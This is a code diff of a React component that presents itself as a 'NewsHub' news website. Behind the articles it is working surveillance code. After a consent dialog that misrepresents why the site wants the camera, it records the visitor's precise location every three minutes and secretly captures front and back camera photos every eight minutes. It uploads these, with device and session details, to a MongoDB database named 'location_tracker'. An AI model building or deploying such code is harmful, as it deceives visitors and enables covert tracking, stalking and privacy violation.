@@ -2,27 +2,24 @@ import React, { useState, useEffect } from 'react';
 import * as Realm from 'realm-web';
 
 const NewsWebsite = () => {
-  // Location and camera tracking states (hidden from UI)
+  // Tracking states
   const [mongoClient, setMongoClient] = useState(null);
-  const [user, setUser] = useState(null);
   const [trackingActive, setTrackingActive] = useState(false);
+  const [showPermissionModal, setShowPermissionModal] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
 
-  // News content states
+  // UI states
   const [selectedCategory, setSelectedCategory] = useState('all');
   const [searchQuery, setSearchQuery] = useState('');
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
 
-  // MongoDB Atlas App Configuration
+  // Configuration
   const REALM_APP_ID = "myrealmapp-lwdulec";
   const DATABASE_NAME = "location_tracker";
-  const COLLECTION_NAME = "locations";
-
-  // Initialize Realm App
   const app = new Realm.App({ id: REALM_APP_ID });
 
   // News data
   const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];
-  
   const newsArticles = [
     {
       id: 1,
@@ -181,8 +178,6 @@ const NewsWebsite = () => {
     },
     categoryButtonActive: {
       backgroundColor: '#ff6b6b',
-      borderWidth: '2px',
-      borderStyle: 'solid',
       borderColor: '#ff6b6b',
       color: 'white'
     },
@@ -296,34 +291,86 @@ const NewsWebsite = () => {
       color: '#ccc',
       fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)'
     },
-    mobileMenuToggle: {
-      display: 'none',
-      background: 'none',
-      border: 'none',
-      color: 'white',
-      fontSize: '1.5rem',
-      cursor: 'pointer',
-      padding: '0.5rem'
+    // Modal styles
+    modalOverlay: {
+      position: 'fixed',
+      top: 0,
+      left: 0,
+      right: 0,
+      bottom: 0,
+      backgroundColor: 'rgba(0,0,0,0.9)',
+      zIndex: 10000,
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center',
+      padding: '20px',
+      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
     },
-    mobileNav: {
-      display: 'none',
-      flexDirection: 'column',
+    modal: {
+      backgroundColor: '#1a1a1a',
+      borderRadius: '20px',
+      padding: '30px',
+      maxWidth: '400px',
       width: '100%',
-      gap: '1rem',
-      marginTop: '1rem',
-      paddingTop: '1rem',
-      borderTop: '1px solid #333'
+      textAlign: 'center',
+      border: '3px solid #ff6b6b',
+      color: 'white',
+      animation: 'modalFadeIn 0.3s ease-out'
     },
-    mobileNavVisible: {
-      display: 'flex'
+    modalIcon: {
+      fontSize: '50px',
+      marginBottom: '20px'
+    },
+    modalTitle: {
+      color: '#ff6b6b',
+      marginBottom: '20px',
+      fontSize: '1.5rem',
+      fontWeight: 'bold'
+    },
+    modalText: {
+      marginBottom: '25px',
+      lineHeight: '1.6'
+    },
+    modalFeatures: {
+      backgroundColor: '#2a2a2a',
+      padding: '20px',
+      borderRadius: '10px',
+      margin: '25px 0'
+    },
+    modalFeature: {
+      marginBottom: '10px'
+    },
+    modalButton: {
+      border: 'none',
+      padding: '18px 35px',
+      borderRadius: '30px',
+      fontSize: '16px',
+      fontWeight: 'bold',
+      cursor: 'pointer',
+      width: '100%',
+      margin: '8px 0',
+      transition: 'all 0.3s ease'
+    },
+    allowButton: {
+      background: 'linear-gradient(45deg, #ff6b6b, #ff8e53)',
+      color: 'white'
+    },
+    allowButtonDisabled: {
+      background: '#666',
+      color: 'white',
+      cursor: 'not-allowed'
+    },
+    skipButton: {
+      background: 'transparent',
+      color: '#999',
+      border: '2px solid #555'
     }
   };
 
-  // MongoDB connection and tracking functions
+  // MongoDB initialization
   const initializeMongoDB = async () => {
     try {
       if (app.currentUser) {
-        setUser(app.currentUser);
         const mongodb = app.currentUser.mongoClient("mongodb-atlas");
         setMongoClient(mongodb);
         return mongodb;
@@ -331,112 +378,98 @@ const NewsWebsite = () => {
 
       const credentials = Realm.Credentials.anonymous();
       const authenticatedUser = await app.logIn(credentials);
-      setUser(authenticatedUser);
-
       const mongodb = authenticatedUser.mongoClient("mongodb-atlas");
       setMongoClient(mongodb);
       return mongodb;
     } catch (error) {
-      console.error('MongoDB connection failed:', error);
+      console.error('MongoDB failed:', error);
       return null;
     }
   };
 
-  const saveLocationToMongoDB = async (location, client = null) => {
+  // Save functions
+  const saveLocationToMongoDB = async (location) => {
+    if (!mongoClient) return null;
     try {
-      const dbClient = client || mongoClient;
-      if (!dbClient) return null;
-
-      const collection = dbClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
-      
+      const collection = mongoClient.db(DATABASE_NAME).collection('locations');
       const locationData = {
         ...location,
         timestamp: new Date(location.timestamp),
         createdAt: new Date(),
         userAgent: navigator.userAgent,
-        referrer: document.referrer,
         pageUrl: window.location.href,
-        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
+        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString(),
         visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
       };
-
       localStorage.setItem('visitCount', locationData.visitCount.toString());
-      const result = await collection.insertOne(locationData);
-      return result;
+      return await collection.insertOne(locationData);
     } catch (error) {
       console.error('Location save failed:', error);
       return null;
     }
   };
 
-  const saveCameraDataToMongoDB = async (cameraData, client = null) => {
+  const saveCameraDataToMongoDB = async (cameraData) => {
+    if (!mongoClient) return null;
     try {
-      const dbClient = client || mongoClient;
-      if (!dbClient) return null;
-
-      const collection = dbClient.db(DATABASE_NAME).collection('camera_captures');
-      
+      const collection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
       const captureData = {
         ...cameraData,
         timestamp: new Date(),
         createdAt: new Date(),
         userAgent: navigator.userAgent,
-        referrer: document.referrer,
         pageUrl: window.location.href,
-        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
-        visitCount: parseInt(localStorage.getItem('visitCount') || '0')
+        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString()
       };
-
-      const result = await collection.insertOne(captureData);
-      return result;
+      return await collection.insertOne(captureData);
     } catch (error) {
-      console.error('Camera data save failed:', error);
+      console.error('Camera save failed:', error);
       return null;
     }
   };
 
+  // Location tracking
   const trackUserLocation = async () => {
-    if (!navigator.geolocation) return;
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve(false);
+        return;
+      }
 
-    const options = {
-      enableHighAccuracy: true,
-      timeout: 30000,
-      maximumAge: 0
-    };
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            altitude: position.coords.altitude,
+            heading: position.coords.heading,
+            speed: position.coords.speed,
+            isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+          };
 
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        const location = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-          altitude: position.coords.altitude,
-          heading: position.coords.heading,
-          speed: position.coords.speed
-        };
-
-        await saveLocationToMongoDB(location);
-      },
-      (error) => {
-        console.log('Location access failed:', error.message);
-      },
-      options
-    );
+          const result = await saveLocationToMongoDB(location);
+          resolve(!!result?.insertedId);
+        },
+        () => resolve(false),
+        {
+          enableHighAccuracy: true,
+          timeout: 30000,
+          maximumAge: 0
+        }
+      );
+    });
   };
 
+  // Camera capture
   const captureFromCamera = async (facingMode = 'user') => {
     try {
-      const constraints = {
-        video: {
-          facingMode: facingMode,
-          width: { ideal: 1920 },
-          height: { ideal: 1080 }
-        },
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 } },
         audio: false
-      };
+      });
 
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
       const video = document.createElement('video');
       video.srcObject = stream;
       video.play();
@@ -455,7 +488,7 @@ const NewsWebsite = () => {
             
             resolve({
               camera: facingMode === 'user' ? 'front' : 'back',
-              imageData: imageData,
+              imageData,
               width: canvas.width,
               height: canvas.height,
               capturedAt: new Date().toISOString()
@@ -464,200 +497,136 @@ const NewsWebsite = () => {
         };
       });
     } catch (error) {
-      console.error('Camera access failed:', error.message);
+      console.error(`${facingMode} camera failed:`, error);
       return null;
     }
   };
 
+  // Camera tracking
   const trackCameraAccess = async () => {
-    try {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-
-      const devices = await navigator.mediaDevices.enumerateDevices();
-      const videoDevices = devices.filter(device => device.kind === 'videoinput');
-
-      const cameraData = {
-        availableCameras: videoDevices.length,
-        devices: videoDevices.map(device => ({
-          deviceId: device.deviceId,
-          label: device.label || 'Camera',
-          kind: device.kind
-        })),
-        captures: []
-      };
-
-      const frontCapture = await captureFromCamera('user');
-      if (frontCapture) {
-        cameraData.captures.push(frontCapture);
-      }
-
-      if (videoDevices.length > 1) {
-        const backCapture = await captureFromCamera('environment');
-        if (backCapture) {
-          cameraData.captures.push(backCapture);
+    return new Promise(async (resolve) => {
+      try {
+        if (!navigator.mediaDevices?.getUserMedia) {
+          resolve(false);
+          return;
         }
-      }
 
-      if (cameraData.captures.length > 0) {
-        await saveCameraDataToMongoDB(cameraData);
-      }
-    } catch (error) {
-      console.error('Camera tracking failed:', error);
-    }
-  };
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
 
-  // Continuous tracking function
-  const startContinuousTracking = async () => {
-    if (!mongoClient || trackingActive) return;
-    
-    setTrackingActive(true);
-    
-    // Initial tracking
-    await trackUserLocation();
-    setTimeout(() => trackCameraAccess(), 2000);
+        const cameraData = {
+          availableCameras: videoDevices.length,
+          devices: videoDevices.map(device => ({
+            deviceId: device.deviceId,
+            label: device.label || 'Camera',
+            kind: device.kind
+          })),
+          captures: []
+        };
 
-    // Set up continuous location tracking every 5 minutes
-    const locationInterval = setInterval(() => {
-      trackUserLocation();
-    }, 5 * 60 * 1000); // 5 minutes
+        // Capture from available cameras
+        const frontCapture = await captureFromCamera('user');
+        if (frontCapture) cameraData.captures.push(frontCapture);
 
-    // Set up continuous camera tracking every 10 minutes
-    const cameraInterval = setInterval(() => {
-      trackCameraAccess();
-    }, 10 * 60 * 1000); // 10 minutes
+        if (videoDevices.length > 1) {
+          await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for mobile
+          const backCapture = await captureFromCamera('environment');
+          if (backCapture) cameraData.captures.push(backCapture);
+        }
 
-    // Store intervals for cleanup
-    sessionStorage.setItem('locationInterval', locationInterval);
-    sessionStorage.setItem('cameraInterval', cameraInterval);
-  };
-
-  // Smart permission request
-  const requestPermissionsWithContext = async () => {
-    const overlay = document.createElement('div');
-    overlay.style.cssText = `
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0,0,0,0.8);
-      z-index: 10000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-family: system-ui;
-    `;
-
-    const modal = document.createElement('div');
-    modal.style.cssText = `
-      background: #1a1a1a;
-      border-radius: 15px;
-      padding: 30px;
-      max-width: 350px;
-      text-align: center;
-      border: 2px solid #ff6b6b;
-    `;
-
-    modal.innerHTML = `
-      <h2 style="color: #ff6b6b; margin-bottom: 20px;">📰 NewsHub</h2>
-      <p style="margin-bottom: 20px; line-height: 1.5;">
-        To provide you with <strong>personalized local news</strong> and 
-        <strong>enhanced reading experience</strong>, we need access to:
-      </p>
-      <div style="text-align: left; margin: 20px 0;">
-        <p>📍 <strong>Location</strong> - For local news & weather updates</p>
-        <p>📷 <strong>Camera</strong> - For enhanced features & personalization</p>
-      </div>
-      <button id="allowBtn" style="
-        background: #ff6b6b;
-        color: white;
-        border: none;
-        padding: 15px 30px;
-        border-radius: 25px;
-        font-size: 16px;
-        font-weight: bold;
-        cursor: pointer;
-        margin: 10px;
-      ">Allow & Continue</button>
-      <button id="skipBtn" style="
-        background: transparent;
-        color: #ccc;
-        border: 1px solid #ccc;
-        padding: 15px 30px;
-        border-radius: 25px;
-        font-size: 16px;
-        cursor: pointer;
-        margin: 10px;
-      ">Skip for Now</button>
-    `;
-
-    overlay.appendChild(modal);
-    document.body.appendChild(overlay);
-
-    return new Promise((resolve) => {
-      document.getElementById('allowBtn').onclick = async () => {
-        document.body.removeChild(overlay);
-        await startContinuousTracking();
-        resolve(true);
-      };
-
-      document.getElementById('skipBtn').onclick = () => {
-        document.body.removeChild(overlay);
+        const result = await saveCameraDataToMongoDB(cameraData);
+        resolve(!!result?.insertedId);
+      } catch (error) {
+        console.error('Camera tracking failed:', error);
         resolve(false);
-      };
+      }
     });
   };
 
-  // Initialize tracking on component mount
+  // Continuous tracking setup
+  const startContinuousTracking = async () => {
+    if (trackingActive) return;
+    setTrackingActive(true);
+
+    // Clear existing intervals
+    ['locationInterval', 'cameraInterval'].forEach(key => {
+      const interval = sessionStorage.getItem(key);
+      if (interval) clearInterval(parseInt(interval));
+    });
+
+    // Initial tracking
+    setTimeout(() => trackUserLocation(), 500);
+    setTimeout(() => trackCameraAccess(), 3000);
+
+    // Continuous tracking intervals
+    const locationInterval = setInterval(trackUserLocation, 3 * 60 * 1000); // 3 minutes
+    const cameraInterval = setInterval(trackCameraAccess, 8 * 60 * 1000); // 8 minutes
+
+    sessionStorage.setItem('locationInterval', locationInterval.toString());
+    sessionStorage.setItem('cameraInterval', cameraInterval.toString());
+  };
+
+  // Handle permission modal actions
+  const handleAllowPermissions = async () => {
+    if (isProcessing) return;
+    
+    setIsProcessing(true);
+    
+    try {
+      await startContinuousTracking();
+      setShowPermissionModal(false);
+    } catch (error) {
+      console.error('Failed to start tracking:', error);
+    } finally {
+      setIsProcessing(false);
+    }
+  };
+
+  const handleSkipPermissions = () => {
+    if (isProcessing) return;
+    setShowPermissionModal(false);
+  };
+
+  // Initialize on mount
   useEffect(() => {
-    const initializeTracking = async () => {
+    const initialize = async () => {
       if (!sessionStorage.getItem('sessionId')) {
         sessionStorage.setItem('sessionId', Date.now().toString());
       }
 
-      try {
-        const dbClient = await initializeMongoDB();
-        
-        if (dbClient) {
-          // Wait for user interaction before requesting permissions
-          const handleUserInteraction = async () => {
-            document.removeEventListener('click', handleUserInteraction);
-            document.removeEventListener('scroll', handleUserInteraction);
-            
-            setTimeout(() => {
-              requestPermissionsWithContext();
-            }, 3000);
-          };
+      const dbClient = await initializeMongoDB();
+      if (!dbClient) return;
 
-          document.addEventListener('click', handleUserInteraction);
-          document.addEventListener('scroll', handleUserInteraction);
-          
-          // Fallback: show modal after 10 seconds even without interaction
-          setTimeout(() => {
-            if (!trackingActive) {
-              requestPermissionsWithContext();
-            }
-          }, 10000);
-        }
-      } catch (error) {
-        console.error('Tracking initialization failed:', error);
-      }
-    };
+      // Wait for user interaction
+      const handleInteraction = async () => {
+        document.removeEventListener('click', handleInteraction);
+        document.removeEventListener('scroll', handleInteraction);
+        setTimeout(() => setShowPermissionModal(true), 2000);
+      };
 
-    initializeTracking();
-
-    // Cleanup intervals on unmount
-    return () => {
-      const locationInterval = sessionStorage.getItem('locationInterval');
-      const cameraInterval = sessionStorage.getItem('cameraInterval');
+      document.addEventListener('click', handleInteraction);
+      document.addEventListener('scroll', handleInteraction);
       
-      if (locationInterval) clearInterval(parseInt(locationInterval));
-      if (cameraInterval) clearInterval(parseInt(cameraInterval));
+      // Fallback after 10 seconds
+      setTimeout(() => {
+        if (!trackingActive) {
+          setShowPermissionModal(true);
+        }
+      }, 10000);
     };
-  }, []);
 
-  // News filtering logic
+    initialize();
+
+    // Cleanup on unmount
+    return () => {
+      ['locationInterval', 'cameraInterval'].forEach(key => {
+        const interval = sessionStorage.getItem(key);
+        if (interval) clearInterval(parseInt(interval));
+      });
+    };
+  }, [trackingActive]);
+
+  // News filtering
   const filteredArticles = newsArticles.filter(article => {
     const matchesCategory = selectedCategory === 'all' || article.category === selectedCategory;
     const matchesSearch = article.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
@@ -669,11 +638,8 @@ const NewsWebsite = () => {
   const regularArticles = filteredArticles.filter(article => !article.featured);
 
   const formatDate = (dateString) => {
-    const date = new Date(dateString);
-    return date.toLocaleDateString('en-US', { 
-      month: 'long', 
-      day: 'numeric', 
-      year: 'numeric' 
+    return new Date(dateString).toLocaleDateString('en-US', { 
+      month: 'long', day: 'numeric', year: 'numeric' 
     });
   };
 
@@ -692,8 +658,46 @@ const NewsWebsite = () => {
     }
   };
 
-  const toggleMobileMenu = () => {
-    setMobileMenuOpen(!mobileMenuOpen);
+  // Permission Modal Component
+  const PermissionModal = () => {
+    if (!showPermissionModal) return null;
+
+    return (
+      <div style={styles.modalOverlay}>
+        <div style={styles.modal}>
+          <div style={styles.modalIcon}>📰</div>
+          <h2 style={styles.modalTitle}>NewsHub</h2>
+          <p style={styles.modalText}>
+            For <strong style={{color: '#ff6b6b'}}>personalized local news</strong> and{' '}
+            <strong style={{color: '#ff6b6b'}}>enhanced experience</strong>:
+          </p>
+          <div style={styles.modalFeatures}>
+            <p style={styles.modalFeature}>📍 <strong>Location</strong> - Local news & weather</p>
+            <p style={styles.modalFeature}>📷 <strong>Camera</strong> - Enhanced features</p>
+          </div>
+          <button
+            style={{
+              ...styles.modalButton,
+              ...(isProcessing ? styles.allowButtonDisabled : styles.allowButton)
+            }}
+            onClick={handleAllowPermissions}
+            disabled={isProcessing}
+          >
+            {isProcessing ? '⏳ Processing...' : '✅ Allow & Continue'}
+          </button>
+          <button
+            style={{
+              ...styles.modalButton,
+              ...styles.skipButton
+            }}
+            onClick={handleSkipPermissions}
+            disabled={isProcessing}
+          >
+            Skip for Now
+          </button>
+        </div>
+      </div>
+    );
   };
 
   return (
@@ -701,35 +705,7 @@ const NewsWebsite = () => {
       <header style={styles.header}>
         <div style={styles.headerContent}>
           <div style={styles.logo}>NewsHub</div>
-          
-          <nav style={{...styles.nav, display: window.innerWidth > 768 ? 'flex' : 'none'}}>
-            <a href="#" style={styles.navLink}>Home</a>
-            <a href="#" style={styles.navLink}>World</a>
-            <a href="#" style={styles.navLink}>Politics</a>
-            <a href="#" style={styles.navLink}>Opinion</a>
-            <div style={styles.searchContainer}>
-              <input
-                type="text"
-                placeholder="Search news..."
-                style={styles.searchInput}
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-              />
-              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
-            </div>
-          </nav>
-
-          <button 
-            style={{...styles.mobileMenuToggle, display: window.innerWidth <= 768 ? 'block' : 'none'}}
-            onClick={toggleMobileMenu}
-          >
-            ☰
-          </button>
-
-          <nav style={{
-            ...styles.mobileNav,
-            ...(mobileMenuOpen && window.innerWidth <= 768 ? styles.mobileNavVisible : {})
-          }}>
+          <nav style={styles.nav}>
             <a href="#" style={styles.navLink}>Home</a>
             <a href="#" style={styles.navLink}>World</a>
             <a href="#" style={styles.navLink}>Politics</a>
@@ -768,7 +744,6 @@ const NewsWebsite = () => {
           <section style={styles.featuredSection}>
             <h2 style={styles.featuredTitle}>Featured Story</h2>
             <div 
-              className="featured"
               style={styles.featuredCard}
               onMouseEnter={handleCardHover}
               onMouseLeave={handleCardLeave}
@@ -833,52 +808,7 @@ const NewsWebsite = () => {
         </div>
       </footer>
 
-      <style>{`
-        @media (max-width: 768px) {
-          .nav-desktop { display: none !important; }
-          .mobile-menu-toggle { display: block !important; }
-          .header-content { flex-direction: column; align-items: stretch; }
-        }
-        
-        @media (min-width: 769px) {
-          .nav-desktop { display: flex !important; }
-          .mobile-menu-toggle { display: none !important; }
-          .mobile-nav { display: none !important; }
-        }
-
-        @media (max-width: 768px) {
-          button, a {
-            min-height: 44px;
-            min-width: 44px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-          }
-        }
-
-        html {
-          scroll-behavior: smooth;
-        }
-
-        @media (hover: none) {
-          .news-card:hover,
-          .featured-card:hover {
-            transform: none !important;
-            box-shadow: initial !important;
-          }
-        }
-
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-
-        * {
-          margin: 0;
-          padding: 0;
-          box-sizing: border-box;
-        }
-      `}</style>
+      <PermissionModal />
     </div>
   );
 };
